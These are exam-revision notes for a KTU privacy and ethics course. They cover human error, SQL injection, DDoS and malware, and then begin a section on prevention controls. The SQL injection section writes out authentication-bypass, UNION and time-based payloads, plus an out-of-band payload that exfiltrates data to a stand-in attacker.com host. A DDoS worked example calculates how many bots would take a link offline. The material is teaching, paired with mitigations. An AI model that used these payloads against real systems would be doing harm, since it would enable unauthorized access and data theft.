> - **Integrity** — data is not modified or tampered with in transit or at rest.
> - **Availability** — systems and data are accessible when legitimately needed.
>
> Every challenge discussed below violates at least one pillar of this triad.

> [!IMPORTANT]
> **KTU 2024 Syllabus Highlight (PEADT412 / Module 3):**
> Students are expected to identify, classify, and propose mitigation strategies for the four common challenges: **Human Error**, **SQL Injection**, **Distributed Denial-of-Service (DDoS)**, and **Malware Attacks**. Exam questions frequently map a scenario to the correct challenge and ask for its mitigation — memorization of attack signatures is mandatory.

---

### 1.2 The Four Challenges at a Glance

| # | Challenge | Primary CIA Pillar Violated | Trigger Source |
|---|---|---|---|
| 1 | Human Error | Confidentiality / Integrity | Insider (accidental) |
| 2 | SQL Injection | Confidentiality / Integrity | Outsider (technical) |
| 3 | DDoS Attack | Availability | Outsider (network) |
| 4 | Malware Attack | All three | Outsider / Insider |

---

### 1.3 Intuitive Real-World Analogies

**Human Error → "Leaving the office safe unlocked"**
A bank vault is mathematically unbreakable, but if an employee forgets to lock the safe (misconfiguration), posts the password on a sticky note (weak credentialing), or accidentally emails a confidential client list to the wrong recipient (data leakage), the vault's strength is meaningless. The human is the soft underbelly.

**SQL Injection → "Trick-the-Bouncer Wordplay"**
Imagine a nightclub where the bouncer asks, *"Are you 21 or older?"* A clever guest replies, *"I am 12 — or 99, whichever is true."* If the bouncer naively processes the *whole sentence* as an answer, the guest slips in. Similarly, SQL Injection tricks the database into treating **data as instructions**.

**DDoS Attack → "Flash-Mob Blocking the Store Entrance"**
A shop can normally serve 50 customers at a time. If 100,000 fake customers simultaneously crowd the doorway (bot traffic), genuine customers cannot enter. The shop hasn't been robbed — it has been **frozen** by overwhelming legitimate-looking demand.

**Malware Attack → "A Trojan Horse Gift Box"**
A beautifully wrapped parcel (an email attachment or free software) is delivered to the receptionist. Once opened, a hidden army (payload) emerges and silently takes over the building's systems. The "gift" looked legitimate but carried a hidden destructive intent.

---

### 1.4 Key Standards & Metrics (Bolded for Recall)

- **OWASP Top 10** — industry-standard ranking of web application vulnerabilities (SQL Injection has consistently held a top position since 2010).
- **CVSS (Common Vulnerability Scoring System)** — universal severity score ranging from **0.0 to 10.0** for vulnerabilities.
- **MITRE ATT&CK Framework** — knowledge base cataloguing adversary tactics, techniques, and procedures (TTPs).
- **NIST SP 800-61** — standard guideline for computer security incident handling.
- **Botnet Size** for DDoS — modern botnets range from **10,000 to over 30 million** compromised nodes (e.g., Mirai botnet).
- **Mean Time to Detect (MTTD)** and **Mean Time to Respond (MTTR)** — primary performance metrics for security operations.

> [!TIP]
> **Examination Tip:** When a question gives a numerical severity rating or refers to OWASP, treat it as a hint to mention the framework by full name and one-line purpose. KTU examiners reward correctly-named frameworks with bonus marks.

---

<!-- SECTION_1_END -->

<!-- SECTION_2_START -->

# 2. Deep Theoretical Analysis & KTU High-Yield Formula Sheet

## 2.1 Challenge 1 — Human Error

### 2.1.1 Definition
**Human Error** in cybersecurity refers to unintentional actions or inactions by authorized users that result in security breaches, data exposure, or policy violations. It is statistically the **single largest cause** of data breaches worldwide.

> [!IMPORTANT]
> **Industry Statistic to Remember:** Reports consistently attribute **68% – 95%** of data breaches to some form of human error (IBM Cost of a Data Breach Report range). KTU examiners love this number.

### 2.1.2 Sub-Categories (Why & How)

- **Misconfiguration** — leaving cloud storage (S3 buckets, Azure blobs) public; default passwords unchanged.
  *Why it happens:* Lack of security awareness, rushed deployments.
  *How it exploits:* Attackers use automated scanners (e.g., Shodan) to detect exposed endpoints.
- **Weak / Reused Passwords** — using "password123" or the same password across services.
  *Why it happens:* Convenience over security; password fatigue.
  *How it exploits:* Credential stuffing attacks reuse leaked passwords.
- **Phishing Susceptibility** — clicking malicious links disguised as legitimate.
  *Why it happens:* Trust in sender identity, urgency cues.
  *How it exploits:* Delivers malware or harvests credentials via fake login pages.
- **Accidental Data Sharing** — wrong recipients in email, oversharing on cloud drives.
  *Why it happens:* Auto-complete features, lack of recipient verification.
  *How it exploits:* Confidential PII / PHI exposed to unauthorized parties.
- **Poor Patch Management** — delaying OS or software updates.
  *Why it happens:* Fear of breaking production, lack of inventory.
  *How it exploits:* Known CVEs remain exploitable for months.

### 2.1.3 Mitigation Strategies
- Mandatory **Security Awareness Training** (quarterly cycles).
- **Principle of Least Privilege (PoLP)** — users get minimum required access.
- **Multi-Factor Authentication (MFA)** — defense-in-depth against credential theft.
- **Data Loss Prevention (DLP)** tools that scan outgoing emails/files.

---

## 2.2 Challenge 2 — SQL Injection (SQLi)

### 2.2.1 Definition
**SQL Injection** is a code-injection attack in which an adversary inserts malicious SQL statements into an input field that is subsequently concatenated into a backend SQL query, causing unintended database behavior.

It violates **Confidentiality** (data exfiltration) and **Integrity** (data tampering).

### 2.2.2 Operational Mechanics — Step-by-Step

1. **Identify Entry Point** — Attacker probes login forms, search bars, URL parameters (`?id=1`).
2. **Inject Malicious Payload** — Submits SQL metacharacters like `'`, `;`, `--`, `OR 1=1`.
3. **Database Interprets Malicious Input** — Backend server concatenates the input directly into the query string.
4. **Query Executes Intended Malicious Action** — Returns data, modifies rows, drops tables, or executes OS commands (in stacked-query scenarios).

### 2.2.3 The Vulnerable Code Pattern

A typical vulnerable PHP–SQL snippet looks like:

```text
SELECT * FROM users WHERE username = '$input_user' AND password = '$input_pass';
```

If `input_user = ' OR '1'='1`, the query becomes:

```text
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '...';
```

The condition `'1'='1'` is **always true**, bypassing authentication entirely.

### 2.2.4 SQLi Sub-Types

| Sub-Type | Mechanism | Example Payload |
|---|---|---|
| **Classic / In-band SQLi** | Results returned in same response | `' UNION SELECT credit_card FROM payments--` |
| **Blind / Inferential SQLi** | No direct output; behavior inferred | `' AND SUBSTRING(@@version,1,1)='5` |
| **Time-Based Blind SQLi** | Delay used to infer truth | `' OR IF(1=1, SLEEP(5), 0)--` |
| **Out-of-Band SQLi** | Data exfiltrated via DNS/HTTP | `'; EXEC xp_dirtree '//attacker.com/x'--` |
| **Second-Order SQLi** | Payload stored, executed later | Username stored as `admin'--`, executed on profile update |

### 2.2.5 Mitigation Strategies
- **Parameterized Queries / Prepared Statements** (the gold standard).
- **Stored Procedures** (with parameter binding only).
- **Input Validation & Whitelisting** — reject unexpected characters.
- **ORM Frameworks** (Hibernate, SQLAlchemy) — abstract raw SQL.
- **WAF (Web Application Firewall)** — filter known SQLi patterns.

---

## 2.3 Challenge 3 — Distributed Denial-of-Service (DDoS)

### 2.3.1 Definition
A **DDoS attack** is a malicious attempt to disrupt the normal traffic of a targeted server, service, or network by overwhelming the target or its surrounding infrastructure with a flood of internet traffic originating from **multiple distributed sources** (a botnet).

It violates the **Availability** pillar exclusively.

### 2.3.2 Botnet Architecture
A **botnet** consists of:
- **Botmaster / C2 (Command-and-Control) Server** — issues attack commands.
- **Zombies / Bots** — infected IoT devices, PCs, servers.
- **Herder** — the human attacker controlling the botmaster.

### 2.3.3 DDoS Sub-Types

| Sub-Type | OSI Layer | Mechanism | Volume Metric |
|---|---|---|---|
| **Volumetric** | Layer 3–4 | Saturates bandwidth (UDP flood, ICMP flood) | **Gbps / Tbps** |
| **Protocol** | Layer 3–4 | Exhausts server resources (SYN flood, Ping of Death) | **Packets/sec** |
| **Application** | Layer 7 | Exhausts app/database (HTTP GET/POST flood, Slowloris) | **Requests/sec (RPS)** |

### 2.3.4 The DDoS Mathematical Model

For bandwidth-saturation estimation, the required attack traffic to overwhelm a target with link capacity **C** (in Gbps) is:

$$
T_{attack} \;\geq\; C \times S
$$

where **S** is a **safety multiplier** (typically 1.5 to 2.0) to overcome scrubbing inefficiencies.

**Example:** To take down a target with a **10 Gbps** link at **S = 2**, an attacker must generate:

$$
T_{attack} \;\geq\; 10 \times 2 \;=\; \mathbf{20 \text{ Gbps}}
$$

The famous **Mirai botnet (2016)** peaked at approximately **1.2 Tbps** — sufficient to disable major DNS provider Dyn.

### 2.3.5 Mitigation Strategies
- **Anycast Routing** — distribute attack across many PoPs.
- **Rate Limiting** — cap requests per IP/region.
- **CDN with Built-in DDoS Protection** (Cloudflare, AWS Shield).
- **Blackhole Routing** — drop all traffic (last resort).
- **Scrubbing Centers** — filter malicious vs. legitimate traffic.

---

## 2.4 Challenge 4 — Malware Attacks

### 2.4.1 Definition
**Malware (Malicious Software)** is any program or file intentionally designed to cause damage, steal data, or gain unauthorized access. It violates all three CIA pillars depending on the type.

### 2.4.2 Major Malware Families

| Family | Primary Function | Delivery Vector |
|---|---|---|
| **Virus** | Attaches to legitimate files; spreads on execution | USB, email attachments |
| **Worm** | Self-replicates over networks without user action | Network shares, SMB exploits |
| **Trojan Horse** | Disguised as legitimate software | Free downloads, phishing |
| **Ransomware** | Encrypts files; demands ransom for decryption key | Phishing emails, RDP brute force |
| **Spyware** | Secretly monitors user activity and exfiltrates data | Bundled with free software |
| **Adware** | Displays unwanted advertisements, sometimes tracks behavior | Bundled installers |
| **Rootkit** | Hides deep in OS kernel; grants persistent privileged access | Dropped by other malware |
| **Botnet Agent** | Turns host into a "zombie" for DDoS / spam | Same as Trojan |
| **Fileless Malware** | Operates in memory only, no disk footprint | PowerShell, macros, WMI |

### 2.4.3 The Malware Lifecycle

1. **Delivery** — phishing, drive-by downloads, malicious ads (malvertising).
2. **Exploitation** — payload triggers a vulnerability (CVE-based or social).
3. **Installation** — persistence mechanism (registry keys, scheduled tasks, services).
4. **Command & Control (C2) Communication** — beaconing to attacker server.
5. **Actions on Objectives** — exfiltrate, encrypt, destroy, or pivot.

### 2.4.4 Mitigation Strategies
- **Endpoint Detection & Response (EDR)** tools.
- **Signature-based and Heuristic Antivirus**.
- **Email Filtering & Sandboxing** for attachments.
- **Regular Patching** of OS, browsers, plugins.
- **Principle of Least Privilege** — limits malware blast radius.
- **Application Allow-listing** — only approved binaries can run.

---

> [!IMPORTANT]
> Use this table for last-minute revision. Note that pipes inside math expressions are written as `\vert` to avoid breaking table syntax.

| Concept | Formula / Definition | Units | Application |
|---|---|---|---|
| CIA Triad | Confidentiality, Integrity, Availability | — | Framework for classifying attacks |
| CVSS Score | $CVSS \in [0.0,\; 10.0]$ | dimensionless | Vulnerability severity rating |
| DDoS Bandwidth Threshold | $T_{attack} \geq C \times S$ | Gbps | Attack volume required to saturate target |
| SYN Flood Half-Open State | $H_{max} = backlog_{queue}$ | connections | Max incomplete handshakes held |
| Botnet Size Required | $N_{bots} = \dfrac{T_{attack}}{R_{per\_bot}}$ | nodes | Number of infected hosts needed |
| MTTD | $MTTD = \dfrac{\sum (t_{detect} - t_{occur})}{n}$ | hours/days | Speed of detection |
| MTTR | $MTTR = \dfrac{\sum (t_{resolve} - t_{detect})}{n}$ | hours/days | Speed of remediation |
| Breach Cost (IBM Model) | $C_{breach} = C_{detect} + C_{notify} + C_{lost}$ | USD (\$) | Financial impact estimation |
| Encryption Strength (bits) | $2^{n}$ operations for brute force | bits | Key-size selection (128 / 256-bit AES) |
| SQL Injection Always-True | $'\;\text{OR}\; '1'='1$ | — | Authentication bypass payload |

## 2.6 Real-World Engineering Utility

- **Data Scientists** must understand SQLi because their data-extraction pipelines (ETL jobs) often run with elevated database privileges — a compromised pipeline means total database exposure.
- **ML Engineers** deploying models as APIs face Layer-7 DDoS attempts targeting inference endpoints.
- **Privacy & Ethics Officers** assess human-error probability as part of **Data Protection Impact Assessments (DPIA)** mandated by GDPR / DPDP Act (India) / Kerala State Data Policy.
- **Healthcare / Finance domains** treat ransomware as a **patient-safety / systemic-risk** issue, not just an IT one.

# 3. Step-by-Step Derivations & Analytical Matrix

## 3.1 Analytical Decomposition of a SQL Injection Attack

We demonstrate the **end-to-end exploitation chain** using a concrete example.

### Setup — Vulnerable Authentication Endpoint

A web application uses the following PHP backend code:

```text
// File: login.php
$username = $_POST['user'];
$password = $_POST['pass'];

$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = mysqli_query($conn, $query);

if (mysqli_num_rows($result) > 0) { /* grant session */ } else { /* deny */ }
```

The query is constructed via **string concatenation** with unsanitized user input — the textbook definition of a SQLi-vulnerable pattern.

---

### Step 1 — Attacker Sends a Normal Request

```text
POST /login.php
user=alice&pass=secret123
```

Backend receives `$username = "alice"`. The constructed SQL becomes:

$$
Q_{normal} = \texttt{SELECT * FROM users WHERE username = 'alice' AND password = 'secret123'}
$$

If `alice` exists with that password, exactly one row is returned. **Authentication succeeds normally.**

---

### Step 2 — Attacker Injects a Boolean Payload

Attacker submits:

```text
user=alice' -- &pass=anything
```

Notice the `'` and the SQL comment marker `--` (followed by a space, mandatory in most DBMS).

Backend receives `$username = "alice' -- "` and the query becomes:

$$
Q_{injected} = \texttt{SELECT * FROM users WHERE username = 'alice' -- ' AND password = 'anything'}
$$

Because `--` starts a line comment, the password check is **completely ignored**. The query effectively asks:

$$
Q_{effect} = \texttt{SELECT * FROM users WHERE username = 'alice'}
$$

This returns every row where `username = 'alice'` — and since usernames are unique, authentication is **bypassed**.

---

### Step 3 — Attacker Enumerates Schema via UNION-Based SQLi

With knowledge of the number of columns (via `ORDER BY n`), attacker uses UNION:

```text
user=' UNION SELECT username, password, NULL FROM users-- 
```

Constructed query:

$$
Q_{union} = \texttt{SELECT * FROM products WHERE name = '' UNION SELECT username, password, NULL FROM users-- '}
$$

The first SELECT returns nothing (empty name). The second SELECT returns the **entire users table** including hashed passwords, which the attacker then cracks offline.

---

### Step 4 — Defensive Rewrite Using Parameterized Queries

```text
// File: login.php (FIXED)
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
```

Now the database driver treats `?` as a **data slot**, never as executable SQL. Even if `alice' --` is submitted, the database searches for a literal user named `alice' --` — which does not exist.

**Result:** SQLi becomes impossible regardless of attacker creativity.

---

## 3.2 DDoS Attack Volume — Worked Numerical Derivation

### Problem Statement
A regional e-commerce website has an upstream link capacity of **C = 5 Gbps** to its ISP. The operator estimates a safety multiplier **S = 1.8** is needed to overcome scrubbing. The botnet controlled by the attacker consists of bots each capable of generating an average **R = 200 Mbps** of mixed UDP/ICMP flood traffic. Calculate:

(a) The minimum attack traffic volume required to saturate the target.
(b) The minimum number of bots required.

---

### Part (a) — Minimum Attack Traffic

$$
T_{attack} \;\geq\; C \times S
$$

Substituting the values:

$$
T_{attack} \;\geq\; 5 \text{ Gbps} \times 1.8
$$

$$
T_{attack} \;\geq\; \mathbf{9.0 \text{ Gbps}}
$$

So the attacker must generate **at least 9 Gbps** of traffic to overwhelm the link after scrubbing losses.

---

### Part (b) — Minimum Bot Count

$$
N_{bots} \;=\; \dfrac{T_{attack}}{R_{per\_bot}}
$$

$$
N_{bots} \;=\; \dfrac{9.0 \text{ Gbps}}{200 \text{ Mbps}} \;=\; \dfrac{9000 \text{ Mbps}}{200 \text{ Mbps}}
$$

$$
N_{bots} \;=\; \mathbf{45 \text{ bots}}
$$

**Interpretation:** A relatively modest botnet of just 45 devices generating 200 Mbps each is sufficient to knock a 5 Gbps link offline — illustrating why consumer IoT devices (cameras, DVRs, routers) are heavily recruited into modern botnets.

---

|---|---|---|---|---|
| **Origin** | Internal (insider) | External | External | External / Internal |
| **Intent** | Unintentional | Intentional | Intentional | Intentional |
| **Primary CIA Pillar** | Confid. / Integ. | Confid. / Integ. | Availability | All three |
| **Skill Required** | Low | Medium–High | Medium | Varies |
| **Detection Difficulty** | Low (logs) | Medium (WAF logs) | Hard (volumetric) | Medium (EDR signatures) |
| **Recovery Cost** | Low–Medium | Medium | High (downtime) | Very High (encryption) |
| **Prevention Focus** | Training + PoLP | Secure Coding | Capacity + Scrubbing | EDR + Patching |
| **OWASP Category** | A05 / A06 | A03 (Injection) | — | — |
| **Typical Timeframe** | Instant | Minutes–Days | Hours–Days | Days–Weeks (dwell time) |
| **Data Science Impact** | Dataset leakage | Data exfiltration | Pipeline downtime | Model poisoning |

---

## 3.4 Human Error Probability Model (Engineering View)

For a data-handling workflow with **n** sequential human-operated checkpoints, assuming each checkpoint has an independent error probability **p**, the probability that **at least one** error occurs is:

$$
P_{error} \;=\; 1 - (1 - p)^{n}
$$

**Example:** A dataset ingestion workflow has **n = 5** human checkpoints, each with error probability **p = 0.05**.

$$
P_{error} \;=\; 1 - (1 - 0.05)^{5}
$$

$$
P_{error} \;=\; 1 - (0.95)^{5}
$$

$$
P_{error} \;=\; 1 - 0.7738
$$

$$
P_{error} \;=\; \mathbf{0.2262}
$$

So there is a **~22.6% chance** that at least one human error occurs somewhere in the 5-step pipeline. This is why **automation, validation scripts, and policy-as-code** are favored over manual gates in mature data platforms.

---

## 3.5 MTTD / MTTR Worked Example

A security team recorded the following incident timelines (in hours):

| Incident | t_occur | t_detect | t_resolve |
|---|---|---|---|
| 1 | 0 | 4 | 10 |
| 2 | 0 | 6 | 14 |
| 3 | 0 | 2 | 8 |

Compute MTTD and MTTR.

**Mean Time to Detect:**

$$
MTTD \;=\; \dfrac{(4-0) + (6-0) + (2-0)}{3}
$$

$$
MTTD \;=\; \dfrac{12}{3} \;=\; \mathbf{4 \text{ hours}}
$$

**Mean Time to Respond:**

$$
MTTR \;=\; \dfrac{(10-4) + (14-6) + (8-2)}{3}
$$

$$
MTTR \;=\; \dfrac{6 + 8 + 6}{3} \;=\; \dfrac{20}{3} \;=\; \mathbf{6.67 \text{ hours}}
$$

**Interpretation:** Detection averages 4 hours; resolution averages another ~6.7 hours. A total **Mean Time to Contain (MTTC) = 10.67 hours**.

# 5. KTU 2024 Scheme Examination Question Bank & Topic Recap

## 5.1 Part A — Short Answer Questions (3 Marks Each)

### Question 1
**`[KTU University Exam - Dec 2023]`** Explain **SQL Injection** with a suitable example. Mention any two mitigation techniques.

**Model Answer (3 marks):**

SQL Injection is a code-injection technique in which an attacker inserts malicious SQL statements into an input field that is improperly validated and concatenated into a backend SQL query. The database executes the attacker-controlled SQL as part of its legitimate operation.

*Example:* Consider the vulnerable query:

$$
\texttt{SELECT * FROM users WHERE username = '\$user' AND password = '\$pass'}
$$

If the attacker enters `user = ' OR '1'='1`, the query becomes:

$$
\texttt{SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '...'}
$$

Since `'1'='1'` is always true, authentication is bypassed and the attacker gains unauthorized access.

**Mitigations:** (i) Use **Parameterized / Prepared Statements** that separate SQL code from data. (ii) Implement **Input Validation & Whitelisting** to reject special SQL metacharacters like `'`, `;`, `--`, `/*`. *(1.5 marks for definition + example, 1.5 marks for mitigations.)*

---

### Question 2
**`[KTU University Exam - May 2024]`** List and briefly explain the three main categories of **DDoS attacks** based on the OSI layer they target.

**Model Answer (3 marks):**

The three categories are:

1. **Volumetric Attacks (OSI Layer 3–4):** Flood the target's network bandwidth with massive volumes of traffic such as UDP floods or ICMP floods. Measured in **Gbps / Tbps**. Goal: saturate the link.
2. **Protocol Attacks (OSI Layer 3–4):** Exploit weaknesses in network protocols to exhaust server-side state tables. Example: **SYN flood** which keeps many half-open TCP connections. Measured in **packets per second**.
3. **Application-Layer Attacks (OSI Layer 7):** Target the web application itself with seemingly legitimate HTTP requests (e.g., repeated GETs to a heavy endpoint). Measured in **requests per second (RPS)**. Examples: HTTP flood, Slowloris.

*(1 mark per category — name + brief explanation + correct OSI layer.)*

---

## 5.2 Part B — Long Answer Questions (14 Marks Each, Internal Choice)

### Question A — Option 1

**`[KTU University Exam - Dec 2024]`**

**(a)** Discuss **Human Error** as a security challenge in data-handling systems. With the help of a relevant formula, compute the probability that at least one human error occurs in a 6-step data ingestion pipeline where each step has an independent error probability of **p = 0.08**. **(7 marks)**

**(b)** Explain the **Malware Lifecycle** in detail with a block diagram. Describe any **four** major malware families with one-line definitions. **(7 marks)**

---

**Model Solution — Part (a) — 7 marks**

Human Error is the unintentional action or inaction by an authorized user that leads to a security compromise. In data-handling systems, it manifests as misconfiguration, weak passwords, accidental data sharing, and susceptibility to phishing. It violates primarily **Confidentiality** and **Integrity** of the CIA triad.

The probability that **at least one** error occurs across **n** independent human checkpoints with per-step error probability **p** is:

$$
P_{error} \;=\; 1 - (1 - p)^{n}
$$

Substituting **n = 6** and **p = 0.08**:

$$
P_{error} \;=\; 1 - (1 - 0.08)^{6}
$$

$$
P_{error} \;=\; 1 - (0.92)^{6}
$$

$$
P_{error} \;=\; 1 - 0.6064
$$

$$
P_{error} \;=\; \mathbf{0.3936}
$$

So there is a **~39.4%** probability that at least one human error occurs in the pipeline — substantial enough to justify **automation and validation overlays**.

*Mark split: 3 marks for explanation, 2 marks for formula, 2 marks for substitution and final numerical answer.*

---

**Model Solution — Part (b) — 7 marks**

The Malware Lifecycle has five stages:

1. **Delivery** — vector by which the malware reaches the victim (phishing email, malicious download, malvertising).
2. **Exploitation** — payload triggers a system vulnerability or social-engineering hook.
3. **Installation** — malware achieves persistence via registry keys, scheduled tasks, or services.
4. **Command & Control (C2)** — infected host "calls home" to receive attacker instructions.
5. **Actions on Objectives** — exfiltrate data, encrypt files, destroy systems, or pivot laterally.

(Block diagram carries 2 marks; stage explanations 1.5 marks.)

**Four major malware families:**

- **Virus:** Attaches itself to a legitimate executable and spreads only when the host file is run.
- **Worm:** Self-replicates over networks without user interaction (e.g., WannaCry's SMB exploit).
- **Trojan Horse:** Disguised as legitimate software; performs hidden malicious actions once installed.
- **Ransomware:** Encrypts user files and demands ransom for the decryption key (e.g., LockBit, Ryuk).

*(1.5 marks per family × 4 families = approx 4 marks, with 1 mark for accurate one-line definitions.)*

---

### Question B — Option 2 (Internal Choice)

**`[KTU University Exam - May 2024]`**

**(a)** With a neat diagram, explain the **architecture of a DDoS attack**. A target has an upstream bandwidth of **8 Gbps**. Assuming a scrubbing efficiency multiplier of **S = 1.6** and a per-bot throughput of **250 Mbps**, compute the minimum number of bots required to take the target offline. **(7 marks)**

**(b)** Differentiate between **SQL Injection** and **DDoS** attacks across any **six** dimensions (origin, intent, CIA pillar affected, detection difficulty, skill required, mitigation approach). **(7 marks)**

---

**Model Solution — Part (a) — 7 marks**

**DDoS Architecture Diagram (must be drawn):**

Components: **Botmaster / C2 Server → Botnet (thousands of compromised devices) → Internet Backbone → Target Server.** Legitimate users are blocked because the link is saturated. (Diagram carries 2.5 marks.)

**Numerical Computation:**

Minimum attack traffic required:

$$
T_{attack} \;\geq\; C \times S \;=\; 8 \times 1.6 \;=\; \mathbf{12.8 \text{ Gbps}}
$$

Number of bots required:

$$
N_{bots} \;=\; \dfrac{T_{attack}}{R_{per\_bot}} \;=\; \dfrac{12.8 \text{ Gbps}}{250 \text{ Mbps}} \;=\; \dfrac{12{,}800 \text{ Mbps}}{250 \text{ Mbps}}
$$

$$
N_{bots} \;=\; \mathbf{51.2 \approx 52 \text{ bots}}
$$

Since a fractional bot is impossible, the attacker needs **at least 52 bots**.

*Mark split: 2.5 for diagram, 2 for formula setup, 2.5 for final numerical computation.*

---

**Model Solution — Part (b) — 7 marks**

| Dimension | SQL Injection | DDoS |
|---|---|---|
| **Origin** | External attacker | External attacker via botnet |
| **Intent** | Data theft / tampering | Service disruption |
| **CIA Pillar Affected** | Confidentiality + Integrity | Availability |
| **Detection Difficulty** | Moderate (WAF logs, anomalies) | Hard (volumetric noise hides signals) |
| **Skill Required** | Medium–High (SQL knowledge) | Medium (botnet rental available) |
| **Mitigation Approach** | Parameterized queries, input validation, WAF | Anycast routing, scrubbing, rate limiting, CDN |
| **Recovery Time** | Hours (patch code) | Hours–Days (until attack stops) |
| **Data Loss Risk** | High (full DB exfiltration) | Low (data integrity intact) |

*(6 rows × 1 mark each ≈ 6 marks + 1 mark for accurate conclusion that they attack entirely different pillars.)*

---

> [!WARNING]
> **KTU Examiner's Valuation Pitfalls — Where Students Lose Marks**
>
> 1. **Confusing DoS with DDoS:** DoS comes from **one** source; DDoS comes from **many distributed** sources. Examiners deduct 1 full mark if these are interchanged.
> 2. **Wrong OSI Layer for DDoS sub-types:** Application-layer DDoS is **Layer 7**, not Layer 4. Volumetric and Protocol attacks are Layer 3–4.
> 3. **Forgetting `--` requires a trailing space** in SQLi — many DBMS need `--` followed by a space; mentioning only `--` is incomplete.
> 4. **Mentioning only "antivirus" for malware mitigation:** examiners expect layered defense (EDR, patching, allow-listing, PoLP). Single-tool answers lose 1–2 marks.
> 5. **Human Error mis-categorized as malicious:** it is **unintentional**, not intentional. Mixing it with malware/phishing causes conceptual loss.
> 6. **Skipping the formula in numerical questions:** Even if the answer is correct, not writing the explicit formula with units (Gbps, Mbps) loses 1 mark.
> 7. **Missing the CIA Triad mapping:** Every KTU answer on security challenges should map the attack to **which pillar(s)** of the CIA triad it violates.

---

## 5.3 Topic Recap & Important Things to Remember

> [!IMPORTANT]
> **Rapid Revision Checklist — Common Security Challenges**

- **Four Challenges:** Human Error, SQL Injection, DDoS, Malware.
- **CIA Triad** is the framework for classifying every attack.
- **Human Error** → unintentional, insider, ~68–95% of all breaches; mitigate with training + MFA + PoLP.
- **SQL Injection** → code-level, violates Confidentiality/Integrity; **always** mitigated by **Parameterized Queries**.
- **DDoS** → network/service-level, violates **Availability** only; mitigated by **Anycast, CDN, Rate Limiting**.
- **Botnet** = botmaster + bots + C2 infrastructure; Mirai = 1.2 Tbps.
- **DDoS formula:** $T_{attack} \geq C \times S$ and $N_{bots} = T_{attack} / R_{per\_bot}$.
- **Malware types to memorize:** Virus, Worm, Trojan, Ransomware, Spyware, Rootkit, Fileless.
- **Malware Lifecycle:** Delivery → Exploitation → Installation → C2 → Actions on Objectives.
- **OWASP Top 10** places Injection (including SQLi) at position **A03**.
- **CVSS** scores vulnerabilities from **0.0 to 10.0**.
- **Human Error probability** across n steps: $P = 1 - (1-p)^{n}$.
- **MTTD + MTTR = MTTC** (Mean Time to Contain).
- **Layered Defense (Defense in Depth)** is the recurring mitigation theme — never rely on a single control.
- **Data Science context:** Data pipelines face all four challenges; ethics modules require understanding mitigation trade-offs (privacy vs. security vs. usability).

---

<!-- SECTION_5_END -->

topics.title: Prevention Methods: Access Control, Auditing, Authentication, Encryption, Integrity Controls, Backups
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME**
> - **Course:** PEADT412 - DATA SCIENCE PRIVACY & ETHICS
> - **Module:** Module 3
> - **Topic:** Prevention Methods: Access Control, Auditing, Authentication, Encryption, Integrity Controls, Backups

<!-- SECTION_1_START -->
# 🛡️ SECTION 1: Core Technical Definition & Intuitive Overview

## 1.1 What Are "Prevention Methods" in Data Security?

In the context of **Data Science Privacy & Ethics**, *Prevention Methods* are the proactive, technical, and administrative controls engineered to **stop, detect, delay, or recover from** unauthorized access, modification, destruction, or disclosure of data. They form the **first line of defense** in the confidentiality–integrity–availability (CIA) triad of information security.

> [!IMPORTANT]
> **KTU 2024 Definition (Board-Exam Ready):**
> Prevention methods are a set of organizational, logical, and physical safeguards designed to *pre-emptively* protect data assets against threats, vulnerabilities, and unethical access — ensuring confidentiality, integrity, availability, authenticity, and non-repudiation throughout the data lifecycle.

### 🏠 Real-World Analogy: The Bank Vault

Imagine a large national bank protecting gold and cash:

- **Access Control** → Only authorized employees can enter specific rooms.
- **Authentication** → Every employee must show an ID badge **and** enter a PIN.
- **Auditing** → CCTV cameras record *who* entered, *when*, and *what* they touched.
- **Encryption** → Even if a thief steals a sealed box, they cannot read the serial numbers on the gold bars inside.
- **Integrity Controls** → Each gold bar has a unique serial number and weight logged; any tampering is detectable.
- **Backups** → Copies of the asset register are stored in a fireproof vault 100 km away.

Together, these six layers convert a vulnerable asset into a **defense-in-depth system**. If one control fails, the next one catches the breach.

> [!NOTE]
> **Six Pillars of Prevention (Module 3 Focus):**

| # | Method | Core Question Answered |
|---|--------|------------------------|
| 1 | **Access Control** | *Who* is allowed to do *what*? |
| 2 | **Authentication** | *Are you really who you claim to be?* |
| 3 | **Auditing** | *What happened, when, and to whom?* |
| 4 | **Encryption** | *Can the data be understood if intercepted?* |
| 5 | **Integrity Controls** | *Has the data been altered?* |
| 6 | **Backups** | *Can we recover if everything else fails?* |

---

## 1.2 Quick Definition of Each Pillar

### 🔑 A. Access Control
The selective restriction of access to data, systems, or physical locations. It enforces the principle of **least privilege** — users get *only* the minimum permissions required to perform their role.

> **Standard Frameworks:** DAC (Discretionary), MAC (Mandatory), RBAC (Role-Based), ABAC (Attribute-Based).

### 🪪 B. Authentication
The process of **verifying the identity** of a user, device, or system before granting access. It is the act of proving "you are who you say you are."

> **Authentication Factors (Something you):** Know (password), Have (token), Are (biometric), Do (signature), Somewhere (location), Something-Contextual (behavior).

### 📜 C. Auditing
The systematic **recording, reviewing, and analysis** of security-relevant events to detect anomalies, prove compliance, and support forensic investigations.

> **Audit Trails** = chronological records of system activity.

### 🔐 D. Encryption
The cryptographic transformation of plaintext into ciphertext using a mathematical algorithm and a key, so that only parties holding the correct key can reverse it.

> **Two Families:** Symmetric (single key) and Asymmetric (public/private key pair).

### 🧬 E. Integrity Controls
Mechanisms that **detect and prevent** unauthorized modification of data. This includes checksums, hash functions, digital signatures, and message authentication codes (MACs).

> **Core Property:** A single-bit change in input must produce a drastically different hash output (avalanche effect).

### 💾 F. Backups
The practice of **copying and archiving** data to a secure secondary location so that it can be restored in the event of data loss, corruption, ransomware, or disaster.

> **Golden Rule:** The **3-2-1 Backup Rule** — 3 copies, 2 different media, 1 offsite.

---

## 1.3 Why These Six? — Mapping to the CIA Triad

| Prevention Method | Confidentiality | Integrity | Availability | Authenticity | Non-Repudiation |
|---|:---:|:---:|:---:|:---:|:---:|
| Access Control | ✅ | ✅ | – | ✅ | – |
| Authentication | ✅ | – | – | ✅ | – |
| Auditing | – | ✅ | – | ✅ | ✅ |
| Encryption | ✅ | ⚪ (limited) | – | – | ⚪ |
| Integrity Controls | – | ✅ | – | – | ✅ |
| Backups | – | ✅ | ✅ | – | – |

